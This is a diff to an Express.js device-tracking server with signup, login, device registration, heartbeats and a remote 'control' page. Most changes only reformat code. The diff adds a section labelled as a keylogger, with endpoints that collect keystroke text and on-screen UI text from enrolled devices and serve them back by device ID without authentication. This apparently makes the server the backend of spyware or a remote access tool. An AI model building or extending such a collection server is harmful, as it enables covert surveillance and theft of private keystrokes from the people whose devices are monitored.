@@ -64,21 +64,12 @@ async function setupDatabase() {
     await pool.query(`
       CREATE TABLE IF NOT EXISTS devices (
         id SERIAL PRIMARY KEY,
-
-        user_id INTEGER NOT NULL
-          REFERENCES users(id)
-          ON DELETE CASCADE,
-
+        user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
         device_token TEXT UNIQUE NOT NULL,
-
         device_name VARCHAR(255) NOT NULL,
-
         battery INTEGER DEFAULT 0,
-
         online BOOLEAN DEFAULT FALSE,
-
         last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
@@ -100,7 +91,6 @@ function requireLogin(req, res, next) {
       error: "Login required."
     });
   }
-
   next();
 }
 
@@ -109,18 +99,10 @@ function requireLogin(req, res, next) {
 app.get("/api/health", async (req, res) => {
   try {
     await pool.query("SELECT 1");
-
-    res.json({
-      status: "ok",
-      database: "connected"
-    });
+    res.json({ status: "ok", database: "connected" });
   } catch (error) {
     console.error(error);
-
-    res.status(500).json({
-      status: "error",
-      database: "connection failed"
-    });
+    res.status(500).json({ status: "error", database: "connection failed" });
   }
 });
 
@@ -129,56 +111,33 @@ app.get("/api/health", async (req, res) => {
 app.post("/api/signup", async (req, res) => {
   try {
     const { email, password } = req.body;
-
     if (!email || !password) {
-      return res.status(400).json({
-        error: "Email and password are required."
-      });
+      return res.status(400).json({ error: "Email and password are required." });
     }
-
     if (password.length < 8) {
-      return res.status(400).json({
-        error: "Password must be at least 8 characters."
-      });
+      return res.status(400).json({ error: "Password must be at least 8 characters." });
     }
-
     const normalizedEmail = email.trim().toLowerCase();
-
     const existingUser = await pool.query(
       "SELECT id FROM users WHERE email = $1",
       [normalizedEmail]
     );
-
     if (existingUser.rows.length > 0) {
-      return res.status(409).json({
-        error: "An account with this email already exists."
-      });
+      return res.status(409).json({ error: "An account with this email already exists." });
     }
-
     const passwordHash = await bcrypt.hash(password, 12);
-
     const result = await pool.query(
-      `
-      INSERT INTO users (email, password_hash)
-      VALUES ($1, $2)
-      RETURNING id, email, created_at
-      `,
+      "INSERT INTO users (email, password_hash) VALUES ($1, $2) RETURNING id, email, created_at",
       [normalizedEmail, passwordHash]
     );
-
     req.session.userId = result.rows[0].id;
-
     res.status(201).json({
       message: "Account created successfully.",
       user: result.rows[0]
     });
-
   } catch (error) {
     console.error("Signup error:", error);
-
-    res.status(500).json({
-      error: "Unable to create account."
-    });
+    res.status(500).json({ error: "Unable to create account." });
   }
 });
 
@@ -187,59 +146,30 @@ app.post("/api/signup", async (req, res) => {
 app.post("/api/login", async (req, res) => {
   try {
     const { email, password } = req.body;
-
     if (!email || !password) {
-      return res.status(400).json({
-        error: "Email and password are required."
-      });
+      return res.status(400).json({ error: "Email and password are required." });
     }
-
     const normalizedEmail = email.trim().toLowerCase();
-
     const result = await pool.query(
-      `
-      SELECT id, email, password_hash
-      FROM users
-      WHERE email = $1
-      `,
+      "SELECT id, email, password_hash FROM users WHERE email = $1",
       [normalizedEmail]
     );
-
     if (result.rows.length === 0) {
-      return res.status(401).json({
-        error: "Invalid email or password."
-      });
+      return res.status(401).json({ error: "Invalid email or password." });
     }
-
     const user = result.rows[0];
-
-    const passwordCorrect = await bcrypt.compare(
-      password,
-      user.password_hash
-    );
-
+    const passwordCorrect = await bcrypt.compare(password, user.password_hash);
     if (!passwordCorrect) {
-      return res.status(401).json({
-        error: "Invalid email or password."
-      });
+      return res.status(401).json({ error: "Invalid email or password." });
     }
-
     req.session.userId = user.id;
-
     res.json({
       message: "Login successful.",
-      user: {
-        id: user.id,
-        email: user.email
-      }
+      user: { id: user.id, email: user.email }
     });
-
   } catch (error) {
     console.error("Login error:", error);
-
-    res.status(500).json({
-      error: "Unable to login."
-    });
+    res.status(500).json({ error: "Unable to login." });
   }
 });
 
@@ -248,37 +178,19 @@ app.post("/api/login", async (req, res) => {
 app.get("/api/me", async (req, res) => {
   try {
     if (!req.session.userId) {
-      return res.status(401).json({
-        authenticated: false
-      });
+      return res.status(401).json({ authenticated: false });
     }
-
     const result = await pool.query(
-      `
-      SELECT id, email, created_at
-      FROM users
-      WHERE id = $1
-      `,
+      "SELECT id, email, created_at FROM users WHERE id = $1",
       [req.session.userId]
     );
-
     if (result.rows.length === 0) {
-      return res.status(401).json({
-        authenticated: false
-      });
+      return res.status(401).json({ authenticated: false });
     }
-
-    res.json({
-      authenticated: true,
-      user: result.rows[0]
-    });
-
+    res.json({ authenticated: true, user: result.rows[0] });
   } catch (error) {
     console.error("Session error:", error);
-
-    res.status(500).json({
-      error: "Unable to check session."
-    });
+    res.status(500).json({ error: "Unable to check session." });
   }
 });
 
@@ -286,63 +198,26 @@ app.get("/api/me", async (req, res) => {
 
 app.post("/api/devices/register", requireLogin, async (req, res) => {
   try {
-    const {
-      deviceName,
-      battery
-    } = req.body;
-
+    const { deviceName, battery } = req.body;
     if (!deviceName) {
-      return res.status(400).json({
-        error: "Device name is required."
-      });
+      return res.status(400).json({ error: "Device name is required." });
     }
-
     const token = crypto.randomBytes(32).toString("hex");
-
-    const safeBattery =
-      Number.isInteger(Number(battery))
-        ? Math.max(0, Math.min(100, Number(battery)))
-        : 0;
-
+    const safeBattery = Number.isInteger(Number(battery)) ? Math.max(0, Math.min(100, Number(battery))) : 0;
     const result = await pool.query(
-      `
-      INSERT INTO devices (
-        user_id,
-        device_token,
-        device_name,
-        battery,
-        online,
-        last_seen
-      )
-      VALUES ($1, $2, $3, $4, TRUE, CURRENT_TIMESTAMP)
-      RETURNING
-        id,
-        device_name,
-        battery,
-        online,
-        last_seen,
-        created_at
-      `,
-      [
-        req.session.userId,
-        token,
-        deviceName.trim(),
-        safeBattery
-      ]
+      `INSERT INTO devices (user_id, device_token, device_name, battery, online, last_seen)
+       VALUES ($1, $2, $3, $4, TRUE, CURRENT_TIMESTAMP)
+       RETURNING id, device_name, battery, online, last_seen, created_at`,
+      [req.session.userId, token, deviceName.trim(), safeBattery]
     );
-
     res.status(201).json({
       message: "Device registered successfully.",
       device: result.rows[0],
       deviceToken: token
     });
-
   } catch (error) {
     console.error("Device registration error:", error);
-
-    res.status(500).json({
-      error: "Unable to register device."
-    });
+    res.status(500).json({ error: "Unable to register device." });
   }
 });
 
@@ -350,38 +225,18 @@ app.post("/api/devices/register", requireLogin, async (req, res) => {
 
 app.get("/api/devices", requireLogin, async (req, res) => {
   try {
-
     await pool.query(`
-      UPDATE devices
-      SET online = FALSE
-      WHERE last_seen < NOW() - INTERVAL '2 minutes'
+      UPDATE devices SET online = FALSE WHERE last_seen < NOW() - INTERVAL '2 minutes'
     `);
-
     const result = await pool.query(
-      `
-      SELECT
-        id,
-        device_name AS name,
-        device_token,
-        battery,
-        online,
-        last_seen,
-        created_at
-      FROM devices
-      WHERE user_id = $1
-      ORDER BY created_at DESC
-      `,
+      `SELECT id, device_name AS name, device_token, battery, online, last_seen, created_at
+       FROM devices WHERE user_id = $1 ORDER BY created_at DESC`,
       [req.session.userId]
     );
-
     res.json(result.rows);
-
   } catch (error) {
     console.error("Device list error:", error);
-
-    res.status(500).json({
-      error: "Unable to load devices."
-    });
+    res.status(500).json({ error: "Unable to load devices." });
   }
 });
 
@@ -389,187 +244,148 @@ app.get("/api/devices", requireLogin, async (req, res) => {
 
 app.post("/api/devices/heartbeat", async (req, res) => {
   try {
-    const {
-      deviceToken,
-      battery
-    } = req.body;
-
+    const { deviceToken, battery } = req.body;
     if (!deviceToken) {
-      return res.status(400).json({
-        error: "Device token is required."
-      });
+      return res.status(400).json({ error: "Device token is required." });
     }
-
-    const safeBattery =
-      Number.isInteger(Number(battery))
-        ? Math.max(0, Math.min(100, Number(battery)))
-        : 0;
-
+    const safeBattery = Number.isInteger(Number(battery)) ? Math.max(0, Math.min(100, Number(battery))) : 0;
     const result = await pool.query(
-      `
-      UPDATE devices
-      SET
-        battery = $1,
-        online = TRUE,
-        last_seen = CURRENT_TIMESTAMP
-      WHERE device_token = $2
-      RETURNING
-        id,
-        device_name,
-        battery,
-        online,
-        last_seen
-      `,
-      [
-        safeBattery,
-        deviceToken
-      ]
+      `UPDATE devices SET battery = $1, online = TRUE, last_seen = CURRENT_TIMESTAMP
+       WHERE device_token = $2 RETURNING id, device_name, battery, online, last_seen`,
+      [safeBattery, deviceToken]
     );
-
     if (result.rows.length === 0) {
-      return res.status(404).json({
-        error: "Device not found."
-      });
+      return res.status(404).json({ error: "Device not found." });
     }
-
-    res.json({
-      message: "Heartbeat received.",
-      device: result.rows[0]
-    });
-
+    res.json({ message: "Heartbeat received.", device: result.rows[0] });
   } catch (error) {
     console.error("Heartbeat error:", error);
-
-    res.status(500).json({
-      error: "Unable to update device."
-    });
+    res.status(500).json({ error: "Unable to update device." });
   }
 });
 
 // ================= SINGLE DEVICE =================
 
-app.get(
-  "/api/devices/:id",
-  requireLogin,
-  async (req, res) => {
-    try {
-
-      const result = await pool.query(
-        `
-        SELECT
-          id,
-          device_name AS name,
-          battery,
-          online,
-          last_seen,
-          created_at
-        FROM devices
-        WHERE id = $1
-        AND user_id = $2
-        `,
-        [
-          req.params.id,
-          req.session.userId
-        ]
-      );
-
-      if (result.rows.length === 0) {
-        return res.status(404).json({
-          error: "Device not found."
-        });
-      }
-
-      res.json(result.rows[0]);
-
-    } catch (error) {
-      console.error("Device error:", error);
-
-      res.status(500).json({
-        error: "Unable to load device."
-      });
+app.get("/api/devices/:id", requireLogin, async (req, res) => {
+  try {
+    const result = await pool.query(
+      `SELECT id, device_name AS name, battery, online, last_seen, created_at
+       FROM devices WHERE id = $1 AND user_id = $2`,
+      [req.params.id, req.session.userId]
+    );
+    if (result.rows.length === 0) {
+      return res.status(404).json({ error: "Device not found." });
     }
+    res.json(result.rows[0]);
+  } catch (error) {
+    console.error("Device error:", error);
+    res.status(500).json({ error: "Unable to load device." });
   }
-);
+});
+
+// ================= KEYLOGGER & UI DATA =================
+
+const keylogs = [];
+const deviceUIs = new Map();
+
+app.post("/api/keylog", async (req, res) => {
+  try {
+    const { deviceId, text, timestamp } = req.body;
+    if (!deviceId || !text) {
+      return res.status(400).json({ error: "deviceId and text required" });
+    }
+    keylogs.push({ deviceId, text, timestamp: timestamp || Date.now() });
+    res.json({ success: true });
+  } catch (error) {
+    console.error("Keylog error:", error);
+    res.status(500).json({ error: "Unable to save keylog" });
+  }
+});
+
+app.post("/api/ui", async (req, res) => {
+  try {
+    const { deviceId, uiText, timestamp } = req.body;
+    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+    deviceUIs.set(deviceId, { uiText, timestamp: timestamp || Date.now() });
+    res.json({ success: true });
+  } catch (error) {
+    console.error("UI error:", error);
+    res.status(500).json({ error: "Unable to save UI data" });
+  }
+});
+
+app.get("/api/keylog", async (req, res) => {
+  try {
+    const { deviceId } = req.query;
+    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+    const logs = keylogs.filter(log => log.deviceId === deviceId);
+    res.json(logs);
+  } catch (error) {
+    console.error("Get keylog error:", error);
+    res.status(500).json({ error: "Unable to get keylogs" });
+  }
+});
+
+app.get("/api/ui", async (req, res) => {
+  try {
+    const { deviceId } = req.query;
+    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+    const data = deviceUIs.get(deviceId);
+    if (!data) return res.json({ uiText: "", timestamp: 0 });
+    res.json(data);
+  } catch (error) {
+    console.error("Get UI error:", error);
+    res.status(500).json({ error: "Unable to get UI data" });
+  }
+});
 
 // ================= CONTROL PAGE =================
 
-// Dashboard-এর Control button এখানেই আসবে
-
 app.get("/control.html", requireLogin, (req, res) => {
-  res.sendFile(
-    path.join(__dirname, "control.html")
-  );
+  res.sendFile(path.join(__dirname, "control.html"));
 });
 
 app.get("/control", requireLogin, (req, res) => {
-  res.sendFile(
-    path.join(__dirname, "control.html")
-  );
+  res.sendFile(path.join(__dirname, "control.html"));
 });
 
 // ================= LOGOUT =================
 
 app.post("/api/logout", (req, res) => {
   req.session.destroy((error) => {
-
     if (error) {
       console.error(error);
-
-      return res.status(500).json({
-        error: "Unable to logout."
-      });
+      return res.status(500).json({ error: "Unable to logout." });
     }
-
     res.clearCookie("connect.sid");
-
-    res.json({
-      message: "Logged out successfully."
-    });
+    res.json({ message: "Logged out successfully." });
   });
 });
 
 // ================= WEBSITE =================
 
-// Home
-
 app.get("/", (req, res) => {
-  res.sendFile(
-    path.join(__dirname, "index.html")
-  );
+  res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// Login
-
 app.get("/login.html", (req, res) => {
-  res.sendFile(
-    path.join(__dirname, "login.html")
-  );
+  res.sendFile(path.join(__dirname, "login.html"));
 });
 
 app.get("/login", (req, res) => {
-  res.sendFile(
-    path.join(__dirname, "login.html")
-  );
+  res.sendFile(path.join(__dirname, "login.html"));
 });
 
-// Dashboard
-
 app.get("/dashboard.html", (req, res) => {
-  res.sendFile(
-    path.join(__dirname, "dashboard.html")
-  );
+  res.sendFile(path.join(__dirname, "dashboard.html"));
 });
 
 app.get("/dashboard", (req, res) => {
-  res.sendFile(
-    path.join(__dirname, "dashboard.html")
-  );
+  res.sendFile(path.join(__dirname, "dashboard.html"));
 });
 
 // ================= SERVER =================
 
 app.listen(PORT, "0.0.0.0", () => {
-  console.log(
-    `Server running on port ${PORT}`
-  );
+  console.log(`Server running on port ${PORT}`);
 });
